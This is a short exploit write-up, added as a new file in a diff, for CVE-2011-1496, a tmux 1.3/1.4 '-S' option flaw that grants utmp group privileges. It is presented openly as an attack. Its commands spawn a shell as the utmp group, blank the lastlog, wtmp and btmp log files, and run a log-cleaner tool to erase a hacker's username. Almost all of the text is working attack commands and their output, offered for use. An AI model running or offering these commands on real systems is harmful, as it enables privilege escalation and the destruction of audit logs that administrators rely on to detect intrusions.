@@ -1,0 +1,48 @@
+---------------------------------------
+| Team ph0x90bic proudly presents     |
+| tmux -S 1.3/1.4 local utmp exploit  |
+---------------------------------------
+
+# Exploit Title: tmux '-S' Option Incorrect SetGID Local Privilege Escalation Vulnerability
+# Date: 11.04.2011
+# Author: ph0x90bic
+# Software Link: http://tmux.sourceforge.net/
+# Version: 1.3/1.4
+# Tested on: Linux debian 2.6.26-1-686
+# CVE : CVE-2011-1496
+
+---
+
+INTRODUCTION
+
+tmux 1.3/1.4 contains a privilege escalation vulnerabillity,
+which gives you utmp group privileges. This bug is important,
+because it is possible to clean logfiles and use logcleaners
+for btmp, wtmp and lastlog without local root access.
+
+---
+
+EXPLOIT
+
+Execute shell as utmp group
+
+$ tmux -S /tmp/.whateveryouwant -c id
+uid=1001(company) gid=1001(company) egid=43(utmp), groups=1001(company)
+
+$ tmux -S /tmp/.whateveryouwant -c /bin/sh
+$ id
+uid=1001(company) gid=1001(company) egid=43(utmp), groups=1001(company)
+
+--
+
+Delete logfiles
+
+$ tmux -S /tmp/.whateveryouwant -c '> /var/log/lastlog'
+$ tmux -S /tmp/.whateveryouwant -c '> /var/log/wtmp'
+$ tmux -S /tmp/.whateveryouwant -c '> /var/log/btmp'
+
+--
+
+Use logcleaner software
+
+$ tmux -S /tmp/.whateveryouwant -c /tmp/thcclear13/cleara hacker-username
